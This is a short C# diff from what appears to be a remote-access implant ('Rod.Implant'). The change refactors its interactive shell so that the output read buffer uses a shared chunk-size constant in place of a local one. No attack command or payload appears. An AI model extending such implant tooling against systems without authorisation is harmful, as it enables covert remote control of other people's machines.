@@ -41,11 +41,6 @@ namespace Rod.Implant.Internal;
 /// </summary>
 internal static class InteractiveShell
 {
-    // The output pump's read buffer: one read is one output chunk, so this is
-    // the largest ChannelOutput frame the channel emits -- well inside the
-    // frame-layer sizing budget with protobuf overhead to spare.
-    private const int OutputChunkBytes = 16 * 1024;
-
     // The self-close window: generous on purpose (see the class summary) --
     // an operator watching a long printout types nothing for minutes at a
     // time, and their session must survive it.
@@ -214,7 +209,7 @@ internal static class InteractiveShell
         IChannelStream stream,
         CancellationToken cancellationToken)
     {
-        var buffer = new byte[OutputChunkBytes];
+        var buffer = new byte[Chunking.ChannelOutputChunkBytes];
         while (true)
         {
             var read = await source.ReadAsync(buffer, cancellationToken);
